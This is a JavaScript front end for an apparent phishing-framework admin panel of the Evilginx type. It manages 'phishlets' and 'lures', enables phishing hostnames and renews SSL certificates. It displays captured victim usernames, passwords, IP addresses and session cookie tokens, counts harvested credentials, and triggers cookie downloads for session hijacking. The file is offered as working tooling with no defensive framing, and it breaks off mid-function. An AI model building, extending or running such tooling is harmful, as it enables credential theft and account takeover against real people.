// Main UI elements
const sidebar = document.querySelector('.sidebar');
const content = document.querySelector('.content');
const menuToggle = document.querySelector('.menu-toggle');
const navLinks = document.querySelectorAll('.sidebar-nav a');
const tabContents = document.querySelectorAll('.tab-content');
const logoutBtn = document.getElementById('logout-btn');

// Tab-specific elements
const phishletsTable = document.getElementById('phishlets-table');
const luresTable = document.getElementById('lures-table');
const sessionsTable = document.getElementById('sessions-table');
const phishletsRefreshBtn = document.getElementById('refresh-phishlets');
const luresRefreshBtn = document.getElementById('refresh-lures');
const sessionsRefreshBtn = document.getElementById('sessions-refresh-btn');
const createLureBtn = document.getElementById('create-lure-btn');
const updateCertificatesBtn = document.getElementById('update-certificates-btn');
const lastUpdatedSpan = document.querySelector('.last-updated');

// Dashboard statistics
const phishletsCountElement = document.getElementById('phishlets-count');
const luresCountElement = document.getElementById('lures-count');
const sessionsCountElement = document.getElementById('sessions-count');
const credentialsCountElement = document.getElementById('credentials-count');

// Base API URL
const API_BASE_URL = window.location.origin + '/api';

// Global variables
let authToken = localStorage.getItem('authToken');
let phishlets = [];
let lures = [];
let sessions = [];
let credentials = [];

// Check login status
function checkAuthentication() {
    if (!authToken) {
        return Promise.reject(new Error('Not authenticated'));
    }
    return Promise.resolve();
}

// Add authentication header to API requests
function getHeaders() {
    return {
        'Authorization': authToken,
        'Content-Type': 'application/json'
    };
}

// Error handling function
function handleApiError(error) {
    console.error('API Error:', error);
    if (error.status === 401) {
        // Logout if authentication is invalid
        localStorage.removeItem('authToken');
        window.location.href = '/login';
    }
    showToast('Error', error.message || 'An error occurred while connecting to the server', 'error');
}

// Function to update time
function updateLastUpdated() {
    const now = new Date();
    const options = {
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit'
    };
    lastUpdatedSpan.textContent = now.toLocaleTimeString('en-US', options);
}

// Show toast notification
function showToast(title, message, type = 'info') {
    const toastContainer = document.getElementById('toast-container');
    const toast = document.createElement('div');
    toast.className = `toast toast-${type}`;
    
    let icon = '';
    switch(type) {
        case 'success': icon = 'fas fa-check-circle'; break;
        case 'error': icon = 'fas fa-exclamation-circle'; break;
        case 'warning': icon = 'fas fa-exclamation-triangle'; break;
        default: icon = 'fas fa-info-circle';
    }
    
    toast.innerHTML = `
        <div class="toast-icon"><i class="${icon}"></i></div>
        <div class="toast-content">
            <div class="toast-title">${title}</div>
            <div class="toast-message">${message}</div>
        </div>
        <button class="toast-close"><i class="fas fa-times"></i></button>
    `;
    
    toastContainer.appendChild(toast);
    
    // Remove notification after 5 seconds
    setTimeout(() => {
        toast.style.opacity = '0';
        setTimeout(() => {
            toastContainer.removeChild(toast);
        }, 300);
    }, 5000);
    
    // Close button for notification
    toast.querySelector('.toast-close').addEventListener('click', () => {
        toast.style.opacity = '0';
        setTimeout(() => {
            toastContainer.removeChild(toast);
        }, 300);
    });
}

// ================= API Calls =================

// Fetch Phishlets list
async function fetchPhishlets() {
    try {
        const response = await fetch(`${API_BASE_URL}/phishlets`, {
            method: 'GET',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'Failed to fetch Phishlets'
            };
        }
        
        const result = await response.json();
        // Prepare data in appropriate format
        phishlets = Array.isArray(result) ? result : (result.data || []);
        console.log('Received Phishlets:', phishlets);
        return phishlets;
    } catch (error) {
        console.error('Error fetching Phishlets:', error);
        handleApiError(error);
        return [];
    }
}

// Fetch Lures list
async function fetchLures() {
    try {
        const response = await fetch(`${API_BASE_URL}/lures`, {
            method: 'GET',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'Failed to fetch Lures'
            };
        }
        
        const result = await response.json();
        // Prepare data in appropriate format
        lures = Array.isArray(result) ? result : (result.data || []);
        console.log('Received Lures:', lures);
        return lures;
    } catch (error) {
        console.error('Error fetching Lures:', error);
        handleApiError(error);
        return [];
    }
}

// Fetch Sessions list
async function fetchSessions() {
    try {
        const response = await fetch(`${API_BASE_URL}/sessions`, {
            method: 'GET',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'Failed to fetch Sessions'
            };
        }
        
        const result = await response.json();
        console.log('Original API response for sessions:', result);
        
        // Prepare data in the appropriate format
        // Check the format of the received data and convert it to a unified format
        sessions = [];
        
        if (sessions.length === 0) {
            if (Array.isArray(result)) {
                sessions = result;
            } else if (result.data) {
                sessions = result.data;
            } else if (typeof result === 'object') {
                // If the response is an object, it might contain sessions
                const possibleArrayKeys = ['sessions', 'data', 'records', 'items'];
                for (const key of possibleArrayKeys) {
                    if (Array.isArray(result[key])) {
                        sessions = result[key];
                        break;
                    }
                }
                
                // If we didn't find an array, the data might be stored as values in the object
                if (sessions.length === 0) {
                    const sessionIds = Object.keys(result);
                    if (sessionIds.length > 0) {
                        sessions = sessionIds.map(id => {
                            const session = result[id];
                            session.id = id;
                            return session;
                        });
                    }
                }
            }
        }
        
        console.log('Processed sessions data:', sessions);
        return sessions;
    } catch (error) {
        console.error('Error fetching Sessions:', error);
        handleApiError(error);
        return [];
    }
}

// Enable or disable Phishlet
async function togglePhishlet(name, enable) {
    try {
        console.log(`Attempting to ${enable ? 'enable' : 'disable'} Phishlet: ${name}`);
        
        // If we're trying to enable, first check if it has a hostname
        if (enable) {
            // Get phishlet information
            const phishletResponse = await fetch(`${API_BASE_URL}/phishlets/${name}`, {
                method: 'GET',
                headers: getHeaders()
            });
            
            if (!phishletResponse.ok) {
                throw new Error(`Failed to get information for Phishlet: ${phishletResponse.statusText}`);
            }
            
            const phishletData = await phishletResponse.json();
            console.log(`Phishlet ${name} data:`, phishletData);
            
            // Check if the phishlet needs a hostname
            if (!phishletData.data.hostname || phishletData.data.hostname === "") {
                // Show prompt for requesting hostname
                const hostname = await showHostnamePrompt(name);
                if (!hostname) {
                    // User canceled the operation
                    return false;
                }
                
                // Update hostname for the phishlet
                const hostnameResponse = await fetch(`${API_BASE_URL}/configs/hostname`, {
                    method: 'POST',
                    headers: {
                        ...getHeaders(),
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        phishlet: name,
                        hostname: hostname
                    })
                });
                
                if (!hostnameResponse.ok) {
                    let errorMessage = `Server error: ${hostnameResponse.status}`;
                    try {
                        const responseData = await hostnameResponse.json();
                        if (responseData.message) {
                            errorMessage = responseData.message;
                        }
                    } catch (e) {
                        console.error("Error parsing error response:", e);
                    }
                    
                    throw new Error(`Failed to set hostname: ${errorMessage}`);
                }
                
                console.log(`Hostname set successfully for Phishlet ${name}`);
            }
        }
        
        // Now we proceed to enable/disable the phishlet
        const action = enable ? 'enable' : 'disable';
        const response = await fetch(`${API_BASE_URL}/phishlets/${name}/${action}`, {
            method: 'POST',
            headers: getHeaders()
        });
        
        // Log full API response for debugging
        console.log(`API response for ${action} Phishlet:`, response);
        
        if (!response.ok) {
            let errorMessage = `Server error: ${response.status}`;
            try {
                const errorData = await response.json();
                if (errorData.message) {
                    errorMessage = errorData.message;
                }
            } catch (e) {
                console.error("Error parsing API error response:", e);
            }
            
            throw new Error(`Failed to ${enable ? 'enable' : 'disable'} Phishlet: ${errorMessage}`);
        }
        
        const data = await response.json();
        console.log(`Full API response for ${action} Phishlet:`, data);
        
        if (data.success) {
            showToast('Success', `Successfully ${enable ? 'enabled' : 'disabled'} Phishlet ${name}`, 'success');
            
            // Check if configurations were saved
            await checkConfigSaved();
            
            return true;
        } else {
            showToast('Error', `Failed to ${enable ? 'enable' : 'disable'} Phishlet: ${data.message || 'Unknown error'}`, 'error');
            return false;
        }
    } catch (error) {
        console.error(`Error in ${enable ? 'enabling' : 'disabling'} Phishlet:`, error);
        showToast('Error', `An error occurred: ${error.message}`, 'error');
        return false;
    }
}

// Show prompt for requesting hostname
async function showHostnamePrompt(phishletName) {
    return new Promise((resolve) => {
        // Create elements
        const modal = document.createElement('div');
        modal.className = 'modal active';
        modal.innerHTML = `
            <div class="modal-content">
                <div class="modal-header">
                    <h3>Set Hostname for Phishlet</h3>
                    <button class="modal-close">&times;</button>
                </div>
                <div class="modal-body">
                    <p>You must enter a hostname to enable the phishlet "${phishletName}"</p>
                    <div class="form-group">
                        <label for="hostname-input">Hostname</label>
                        <input type="text" id="hostname-input" class="form-control" placeholder="example.yourdomain.com">
                        <small class="form-text">
                            Enter the subdomain that will be used for this phishlet. 
                            Make sure this domain points to your server.
                        </small>
                    </div>
                </div>
                <div class="modal-footer">
                    <button class="btn btn-secondary cancel-btn">Cancel</button>
                    <button class="btn btn-primary save-btn">Save</button>
                </div>
            </div>
        `;
        document.body.appendChild(modal);
        
        // Focus on input field
        const input = modal.querySelector('#hostname-input');
        setTimeout(() => input.focus(), 100);
        
        // Add event listeners
        const closeBtn = modal.querySelector('.modal-close');
        const cancelBtn = modal.querySelector('.cancel-btn');
        const saveBtn = modal.querySelector('.save-btn');
        
        function close(value = null) {
            document.body.removeChild(modal);
            resolve(value);
        }
        
        closeBtn.addEventListener('click', () => close());
        cancelBtn.addEventListener('click', () => close());
        
        saveBtn.addEventListener('click', () => {
            const hostname = input.value.trim();
            if (!hostname) {
                showToast('Error', 'Please enter a valid hostname', 'error');
                return;
            }
            close(hostname);
        });
        
        // Handle Enter key press in input field
        input.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                saveBtn.click();
            }
        });
    });
}

// Check if changes were saved
async function checkConfigSaved() {
    try {
        // Request to save configuration
        const response = await fetch(`${API_BASE_URL}/config/save`, {
            method: 'POST',
            headers: getHeaders()
        });
        
        const data = await response.json();
        console.log('Configuration save response:', data);
        
        if (data.success) {
            console.log('Configuration saved successfully');
            return true;
        } else {
            console.warn('Failed to save configuration:', data.message);
            return false;
        }
    } catch (error) {
        console.error('Error saving configuration:', error);
        return false;
    }
}

// Show hostname modal
function showHostnameModal(phishletName, callback) {
    // Create modal elements
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h3>Set Hostname for Phishlet</h3>
                <button class="modal-close">&times;</button>
            </div>
            <div class="modal-body">
                <p>You must enter a hostname to enable the phishlet "${phishletName}"</p>
                <div class="form-group">
                    <label for="phishlet-hostname">Hostname</label>
                    <input type="text" id="phishlet-hostname" class="form-control" placeholder="example.yourdomain.com">
                    <small class="form-text">
                        Enter the full domain name that will be used for this phishlet. 
                        Make sure this domain is registered and points to your server.
                    </small>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn-secondary modal-cancel-btn">Cancel</button>
                <button class="btn-primary modal-save-btn">Save and Enable</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    
    // Add event listeners
    const closeButtons = modal.querySelectorAll('.modal-close, .modal-cancel-btn');
    closeButtons.forEach(button => {
        button.addEventListener('click', function() {
            document.body.removeChild(modal);
            callback(null); // Cancel the operation
        });
    });
    
    const saveButton = modal.querySelector('.modal-save-btn');
    saveButton.addEventListener('click', function() {
        const hostname = modal.querySelector('#phishlet-hostname').value.trim();
        if (!hostname) {
            showToast('Error', 'Please enter a hostname', 'error');
            return;
        }
        document.body.removeChild(modal);
        callback(hostname);
    });
    
    // Focus on input field
    setTimeout(() => {
        modal.querySelector('#phishlet-hostname').focus();
    }, 100);
}

// Create new Lure
async function createLure(lureData) {
    try {
        const response = await fetch(`${API_BASE_URL}/lures`, {
            method: 'POST',
            headers: {
                ...getHeaders(),
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(lureData)
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'Failed to create Lure'
            };
        }
        
        showToast('Success', 'Successfully created new Lure', 'success');
        return await response.json();
    } catch (error) {
        console.error('Error creating Lure:', error);
        handleApiError(error);
        return null;
    }
}

// Delete Lure
async function deleteLure(id) {
    try {
        console.log(`Attempting to delete Lure with ID ${id}`);
        
        const response = await fetch(`${API_BASE_URL}/lures/${id}`, {
            method: 'DELETE',
            headers: getHeaders()
        });
        
        console.log('Lure delete response:', response);
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'Failed to delete Lure'
            };
        }
        
        // Attempt to read the response as JSON
        let responseData;
        try {
            responseData = await response.json();
            console.log('Lure delete response data:', responseData);
        } catch (e) {
            console.log('Unable to read delete response as JSON', e);
        }
        
        return true;
    } catch (error) {
        console.error('Error in deleting Lure:', error);
        handleApiError(error);
        return false;
    }
}

// Populate Session details
async function fetchSessionDetails(id) {
    try {
        const response = await fetch(`${API_BASE_URL}/sessions/${id}`, {
            method: 'GET',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: 'Failed to fetch Session details'
            };
        }
        
        const responseJson = await response.json();
        console.log('Session details response:', responseJson);
        
        // Extract data from Data field in the response
        if (responseJson.success && responseJson.data) {
            return responseJson.data;
        } else {
            return responseJson;
        }
    } catch (error) {
        console.error('Error fetching session details:', error);
        handleApiError(error);
        return null;
    }
}

// Enable or disable Lure
async function toggleLure(id, enable) {
    try {
        console.log(`Attempting to ${enable ? 'enable' : 'disable'} Lure with ID ${id}`);
        
        const action = enable ? 'enable' : 'disable';
        const response = await fetch(`${API_BASE_URL}/lures/${id}/${action}`, {
            method: 'POST',
            headers: getHeaders()
        });
        
        console.log(`API response for ${enable ? 'enabling' : 'disabling'} Lure:`, response);
        
        if (!response.ok) {
            throw {
                status: response.status,
                message: `Failed to ${enable ? 'enable' : 'disable'} Lure`
            };
        }
        
        // Attempt to read the response as JSON
        let responseData;
        try {
            responseData = await response.json();
            console.log(`API response for ${enable ? 'enabling' : 'disabling'} Lure:`, responseData);
        } catch (e) {
            console.log('Unable to read API response as JSON', e);
        }
        
        showToast('Success', `Successfully ${enable ? 'enabled' : 'disabled'} Lure`, 'success');
        return true;
    } catch (error) {
        console.error(`Error in ${enable ? 'enabling' : 'disabling'} Lure:`, error);
        handleApiError(error);
        return false;
    }
}

// ================= UI Functions =================

// Update dashboard
async function updateDashboard() {
    try {
        updateLastUpdated();
        
        // Fetch data from API
        const [phishletsData, luresData, sessionsData] = await Promise.all([
            fetchPhishlets(),
            fetchLures(),
            fetchSessions()
        ]);
        
        // Update statistics
        phishletsCountElement.textContent = phishletsData.length;
        luresCountElement.textContent = luresData.length;
        sessionsCountElement.textContent = sessionsData.length;
        
        // Calculate logged in credentials count
        let credCount = 0;
        sessionsData.forEach(session => {
            if (session.username && session.password) {
                credCount++;
            }
        });
        credentialsCountElement.textContent = credCount;
        
        // Update recent sessions table
        const recentSessionsTable = document.getElementById('recent-sessions-table');
        if (recentSessionsTable) {
            populateRecentSessionsTable(recentSessionsTable, sessionsData.slice(0, 5));
        }
    } catch (error) {
        console.error('Error updating dashboard:', error);
        showToast('Error', 'Failed to update dashboard', 'error');
    }
}

// Populate recent sessions table
function populateRecentSessionsTable(tableElement, sessions) {
    const tbody = tableElement.querySelector('tbody');
    tbody.innerHTML = '';
    
    if (!sessions || sessions.length === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="5" class="text-center">No logged sessions</td>`;
        tbody.appendChild(tr);
        return;
    }
    
    sessions.forEach(session => {
        // Ensure all required data is present
        const sessionId = session.id || session.Id || session.session_id || session.SessionId || 'Unknown';
        const phishlet = session.phishlet || session.Phishlet || '';
        const username = session.username || session.Username || session.user || session.User || session.login || 'Not logged in';
        const ip = session.remote_addr || session.RemoteAddr || session.ip || session.IP || session.remote_ip || 'Unknown';
        
        // Attempt to find creation time, it might be in multiple fields
        let created = null;
        if (session.create_time) created = session.create_time * 1000; // Convert from seconds to milliseconds
        else if (session.CreateTime) created = session.CreateTime * 1000;
        else if (session.created) created = session.created;
        else if (session.timestamp) created = session.timestamp;
        else if (session.time) created = session.time;
        
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${sessionId}</td>
            <td>${phishlet}</td>
            <td>${username}</td>
            <td>${ip}</td>
            <td>${formatDate(created)}</td>
        `;
        tbody.appendChild(tr);
    });
}

// Populate Phishlets table
function populatePhishletsTable(phishlets) {
    const tbody = phishletsTable.querySelector('tbody');
    tbody.innerHTML = '';
    
    if (!phishlets || phishlets.length === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="5" class="text-center">No phishlets</td>`;
        tbody.appendChild(tr);
        return;
    }
    
    console.log('Received Phishlets data:', phishlets);
    
    phishlets.forEach(phishlet => {
        const tr = document.createElement('tr');
        // Ensure all required properties are present
        const name = phishlet.name || phishlet.id || '';
        const author = phishlet.author || '';
        const hostname = phishlet.hostname || '';
        
        // Check activation status - it might be in any of these fields
        const enabled = phishlet.is_active === true || phishlet.isActive === true || phishlet.IsActive === true || phishlet.enabled === true;
        
        tr.innerHTML = `
            <td>${name}</td>
            <td>${author}</td>
            <td>${hostname || 'Not specified'}</td>
            <td><span class="badge ${enabled ? 'badge-success' : 'badge-danger'}">${enabled ? 'Enabled' : 'Disabled'}</span></td>
            <td class="action-buttons">
                <button class="btn btn-sm ${enabled ? 'btn-danger' : 'btn-success'}" data-action="${enabled ? 'disable' : 'enable'}" data-name="${name}">
                    <i class="fas fa-${enabled ? 'power-off' : 'play'}"></i>
                    ${enabled ? 'Disable' : 'Enable'}
                </button>
            </td>
        `;
        tbody.appendChild(tr);
    });
    
    // Add event listeners for enable/disable buttons
    const actionButtons = tbody.querySelectorAll('[data-action]');
    actionButtons.forEach(button => {
        button.addEventListener('click', async function() {
            const name = this.dataset.name;
            const action = this.dataset.action;
            
            if (action === 'enable') {
                const success = await togglePhishlet(name, true);
                if (!success) return;
            } else if (action === 'disable') {
                const success = await togglePhishlet(name, false);
                if (!success) return;
            }
            
            // Update Phishlets table
            const updatedPhishlets = await fetchPhishlets();
            populatePhishletsTable(updatedPhishlets);
        });
    });
}

// Populate Lures table
function populateLuresTable(lures) {
    const tbody = luresTable.querySelector('tbody');
    tbody.innerHTML = '';
    
    if (!lures || lures.length === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="6" class="text-center">No lures</td>`;
        tbody.appendChild(tr);
        return;
    }
    
    console.log('Full Lures data:', lures);
    
    lures.forEach((lure, index) => {
        // Ensure all required data is present
        const id = lure.id || index;
        const phishlet = lure.phishlet || '';
        const hostname = lure.hostname || '';
        const path = lure.path || '/';
        const redirectUrl = lure.redirect_url || lure.RedirectUrl || '';
        
        // Check if the lure is enabled or disabled
        const isEnabled = !lure.PausedUntil || lure.PausedUntil === 0 || lure.PausedUntil < Date.now()/1000;
        
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${id}</td>
            <td>${phishlet}</td>
            <td>${hostname}</td>
            <td>${path}</td>
            <td>${redirectUrl}</td>
            <td>
                <span class="badge ${isEnabled ? 'badge-success' : 'badge-danger'}">
                    ${isEnabled ? 'Enabled' : 'Disabled'}
                </span>
            </td>
            <td class="action-buttons">
                <button class="btn btn-sm ${isEnabled ? 'btn-danger' : 'btn-success'} toggle-lure-btn" data-index="${index}" data-action="${isEnabled ? 'disable' : 'enable'}">
                    <i class="fas fa-${isEnabled ? 'power-off' : 'play'}"></i>
                    ${isEnabled ? 'Disable' : 'Enable'}
                </button>
                <button class="btn btn-sm btn-danger delete-lure-btn" data-index="${index}">
                    <i class="fas fa-trash-alt"></i> Delete
                </button>
            </td>
        `;
        tbody.appendChild(tr);
    });
    
    // Add event listeners for enable/disable buttons
    const toggleButtons = tbody.querySelectorAll('.toggle-lure-btn');
    toggleButtons.forEach(button => {
        button.addEventListener('click', async function() {
            const index = Number(this.dataset.index);
            const action = this.dataset.action;
            const enable = action === 'enable';
            
            try {
                // Show loading spinner
                showToast('Processing', `Processing ${enable ? 'enabling' : 'disabling'} Lure...`, 'info');
                
                // Attempt to enable/disable the lure
                const success = await toggleLure(index, enable);
                
                if (success) {
                    // Update Lures table
                    const updatedLures = await fetchLures();
                    populateLuresTable(updatedLures);
                }
            } catch (error) {
                console.error(`Error in ${enable ? 'enabling' : 'disabling'} Lure:`, error);
                showToast('Error', `An error occurred while ${enable ? 'enabling' : 'disabling'} Lure`, 'error');
            }
        });
    });
    
    // Add event listeners for delete buttons
    const deleteButtons = tbody.querySelectorAll('.delete-lure-btn');
    deleteButtons.forEach(button => {
        button.addEventListener('click', async function() {
            const index = Number(this.dataset.index);
            if (confirm('Are you sure you want to delete this Lure?')) {
                try {
                    // Show loading spinner
                    showToast('Processing', 'Processing Lure deletion...', 'info');
                    
                    // Attempt to delete the lure
                    const success = await deleteLure(index);
                    
                    if (success) {
                        // Update Lures table
                        const updatedLures = await fetchLures();
                        populateLuresTable(updatedLures);
                        // Update statistics
                        updateDashboard();
                        
                        showToast('Success', 'Successfully deleted Lure', 'success');
                    } else {
                        showToast('Error', 'Failed to delete Lure', 'error');
                    }
                } catch (error) {
                    console.error('Error in deleting Lure:', error);
                    showToast('Error', 'An error occurred while deleting Lure', 'error');
                }
            }
        });
    });
}

// Populate Sessions table
function populateSessionsTable(sessions) {
    const tbody = sessionsTable.querySelector('tbody');
    tbody.innerHTML = '';
    
    if (!sessions || sessions.length === 0) {
        const tr = document.createElement('tr');
        tr.innerHTML = `<td colspan="7" class="text-center">No logged sessions</td>`;
        tbody.appendChild(tr);
        return;
    }
    
    console.log('Full sessions data:', sessions);
    
    sessions.forEach(session => {
        // Ensure all required data is present using all possible identifiers
        const sessionId = session.id || session.Id || session.session_id || session.SessionId || 'Unknown';
        const phishlet = session.phishlet || session.Phishlet || '';
        const username = session.username || session.Username || session.user || session.User || session.login || 'Not logged in';
        const password = session.password || session.Password || session.pass || session.Pass || 'Not logged in';
        const ip = session.remote_addr || session.RemoteAddr || session.ip || session.IP || session.remote_ip || 'Unknown';
        
        // Attempt to find creation time, it might be in multiple fields
        let created = null;
        if (session.create_time) created = session.create_time * 1000; // Convert from seconds to milliseconds
        else if (session.CreateTime) created = session.CreateTime * 1000;
        else if (session.created) created = session.created;
        else if (session.timestamp) created = session.timestamp;
        else if (session.time) created = session.time;
        
        // Check for presence of credentials
        const hasCredentials = (
            (session.tokens && Object.keys(session.tokens).length > 0) || 
            (session.Tokens && Object.keys(session.Tokens).length > 0) ||
            (session.CookieTokens && Object.keys(session.CookieTokens).length > 0) ||
            username !== 'Not logged in' || 
            password !== 'Not logged in'
        );
        
        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td>${sessionId}</td>
            <td>${phishlet}</td>
            <td>${username}</td>
            <td>${password}</td>
            <td>${ip}</td>
            <td>${formatDate(created)}</td>
            <td class="action-buttons">
                <button class="btn btn-sm btn-primary" data-action="view" data-id="${sessionId}">
                    <i class="fas fa-eye"></i> View
                </button>
                ${hasCredentials ? `<span class="badge badge-success">Logged in credentials</span>` : ''}
            </td>
        `;
        tbody.appendChild(tr);
    });
    
    // Add event listeners for view buttons
    const viewButtons = tbody.querySelectorAll('[data-action="view"]');
    viewButtons.forEach(button => {
        button.addEventListener('click', async function() {
            const id = this.dataset.id;
            // إضافة معرف الجلسة إلى زر التنزيل وإستدعاء دالة تنزيل الكوكيز مباشرة
            const downloadBtn = document.getElementById('download-cookies-btn');
            downloadBtn.dataset.sessionId = id;
            
            // تنزيل الكوكيز مباشرة بدلاً من عرض النافذة المنبثقة
            try {
                // الحصول على تفاصيل الجلسة أولاً للحصول على الكوكيز
                const sessionData = await fetchSessionDetails(id);
                console.log('Session data for cookies:', sessionData);
                
                // استدعاء دالة تنزيل الكوكيز
                downloadCookiesScript();
            } catch (error) {
                console.error('Error fetching session details:', error);
                showToast('خطأ', 'فشل في تحميل تفاصيل الجلسة', 'error');
            }
        });
    });
}

// Show new Lure modal
async function showCreateLureModal() {
    // Fetch Phishlets list for display in dropdown
    const phishlets = await fetchPhishlets();
    
    console.log('Phishlets data at lure creation:', phishlets);
    
    // Create the popup window
    const modal = document.createElement('div');
    modal.className = 'modal active';
    modal.innerHTML = `
        <div class="modal-content">
            <div class="modal-header">
                <h3>Create New Lure</h3>
                <button class="modal-close">&times;</button>
            </div>
            <div class="modal-body">
                <form id="create-lure-form">
                    <div class="form-group">
                        <label for="lure-phishlet">Phishlet</label>
                        <select id="lure-phishlet" class="form-control" required>
                            <option value="">-- Select Phishlet --</option>
                            ${phishlets.map(p => {
                                // Check activation status using all possible fields for the field
                                const isActive = p.is_active === true || p.isActive === true || p.IsActive === true || p.enabled === true;
                                return `<option value="${p.name}" ${isActive ? '' : 'disabled'}>${p.name} ${isActive ? '' : '(Disabled)'}</option>`;
                            }).join('')}
                        </select>
                    </div>
                    <div class="form-group">
                        <label for="lure-hostname">Hostname</label>
                        <input type="text" id="lure-hostname" class="form-control" required>
                    </div>
                    <div class="form-group">
                        <label for="lure-path">Path (optional)</label>
                        <input type="text" id="lure-path" class="form-control" placeholder="/login">
                    </div>
                </form>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary modal-close-btn">Cancel</button>
                <button class="btn btn-primary" id="submit-lure">Create</button>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    
    // Add event listeners for closing
    const closeButtons = modal.querySelectorAll('.modal-close, .modal-close-btn');
    closeButtons.forEach(button => {
        button.addEventListener('click', function() {
            document.body.removeChild(modal);
        });
    });
    
    // Event handler for submitting the form
    const submitButton = modal.querySelector('#submit-lure');
    submitButton.addEventListener('click', async function() {
        const phishlet = modal.querySelector('#lure-phishlet').value;
        const hostname = modal.querySelector('#lure-hostname').value;
        const path = modal.querySelector('#lure-path').value;
        
        if (!phishlet || !hostname) {
            showToast('Error', 'Please fill in all required fields', 'error');
            return;
        }
        
        const lureData = {
            phishlet: phishlet,
            hostname: hostname,
            path: path || '/'
        };
        
        const result = await createLure(lureData);
        if (result) {
            document.body.removeChild(modal);
            
            // Update Lures table
            const updatedLures = await fetchLures();
            populateLuresTable(updatedLures);
            
            // Update statistics
            updateDashboard();
            
            // Update SSL certificates for new lure
            showToast('Information', 'Successfully created lure. Updating SSL certificates...', 'info');
            await updateCertificates();
        }
    });
}

// Format date
function formatDate(dateString) {
    if (!dateString) return 'Not available';
    
    try {
        // Attempt to create Date object
        const date = new Date(dateString);
        
        // Check date validity
        if (isNaN(date.getTime())) {
            return 'Invalid date';
        }
        
        // Format date correctly
        return date.toLocaleString('en-US', {
            year: 'numeric',
            month: 'numeric',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
        });
    } catch (error) {
        console.error('Error in date formatting:', error);
        return 'Invalid date';
    }
}

// ================= Event Handlers =================

// Toggle sidebar navigation
menuToggle.addEventListener('click', function() {
    sidebar.classList.toggle('active');
});

// Navigate between tabs
navLinks.forEach(link => {
    link.addEventListener('click', function(e) {
        e.preventDefault();
        
        // Remove active class from all links
        document.querySelectorAll('.sidebar-nav a').forEach(a => {
            a.classList.remove('active');
        });
        
        // Add active class to current link
        this.classList.add('active');
        
        // Hide all tab contents
        document.querySelectorAll('.tab-content').forEach(tab => {
            tab.style.display = 'none';
        });
        
        // Show content of active tab
        const targetId = this.getAttribute('data-target');
        const targetTab = document.getElementById(targetId);
        if (targetTab) {
            targetTab.style.display = 'block';
            
            // Update data based on active tab
            if (targetId === 'phishlets-tab') {
                fetchPhishlets().then(data => populatePhishletsTable(data));
            } else if (targetId === 'lures-tab') {
                fetchLures().then(data => populateLuresTable(data));
            } else if (targetId === 'sessions-tab') {
                fetchSessions().then(data => populateSessionsTable(data));
            } else if (targetId === 'dashboard-tab') {
                updateDashboard();
            }
        }
    });
});

// Update data buttons
phishletsRefreshBtn.addEventListener('click', function() {
    fetchPhishlets().then(data => {
        populatePhishletsTable(data);
        showToast('Success', 'Successfully updated Phishlets', 'success');
    });
});

luresRefreshBtn.addEventListener('click', function() {
    fetchLures().then(data => {
        populateLuresTable(data);
        showToast('Success', 'Successfully updated Lures', 'success');
    });
});

sessionsRefreshBtn.addEventListener('click', function() {
    fetchSessions().then(data => {
        populateSessionsTable(data);
        showToast('Success', 'Successfully updated Sessions', 'success');
    });
});

// SSL certificates update button
if (updateCertificatesBtn) {
    updateCertificatesBtn.addEventListener('click', function() {
        updateCertificates();
    });
}

// Create new Lure button
createLureBtn.addEventListener('click', showCreateLureModal);

// Logout button
logoutBtn.addEventListener('click', function() {
    // Remove token from local storage
    localStorage.removeItem('authToken');
    // Redirect user to login page
    window.location.href = '/login';
});

// Perform SSL certificates update request
async function updateCertificates() {
    try {
        showToast('Processing', 'Updating SSL certificates...', 'info');
        
        const response = await fetch(`${API_BASE_URL}/config/certificates`, {
            method: 'POST',
            headers: getHeaders()
        });
        
        if (!response.ok) {
            throw new Error(`Failed to update SSL certificates: ${response.statusText}`);
        }
        
        const data = await response.json();
        console.log('SSL certificates update response:', data);
        
        if (data.success) {
            showToast('Success', data.message || 'Successfully updated SSL certificates', 'success');
            return true;
        } else {
            showToast('Error', data.message || 'Failed to update SSL certificates', 'error');
            return false;
        }
    } catch (error) {
        console.error('Error in updating SSL certificates:', error);
        showToast('Error', `An error occurred: ${error.message}`, 'error');
        return false;
    }
}

// ================= Initialization =================

// Initialize page on load
document.addEventListener('DOMContentLoaded', function() {
    // Initialize dashboard
    checkAuthentication()
        .then(() => {
            updateDashboard();
            setupEventListeners();
        })
        .catch(error => {
            console.error('Authentication error:', error);
            // Redirect to login page if not authenticated
            window.location.href = '/static/login.html';
        });

    // Auto refresh dashboard every 60 seconds
    setInterval(updateDashboard, 60000);
});

// Setup event listeners for interactive elements
function setupEventListeners() {
    // Navigation tabs
    const navLinks = document.querySelectorAll('.sidebar-nav a');
    navLinks.forEach(link => {
        link.addEventListener('click', function(e) {
            e.preventDefault();
            const targetId = this.getAttribute('data-target');
            const tabContent = document.getElementById(targetId);
            
            // Remove active class from all tabs
            document.querySelectorAll('.tab-content').forEach(tab => {
                tab.classList.remove('active');
            });
            
            // Add active class to clicked tab
            tabContent.classList.add('active');
            
            // Update navigation active state
            document.querySelectorAll('.sidebar-nav li').forEach(li => {
                li.classList.remove('active');
            });
            this.parentElement.classList.add('active');
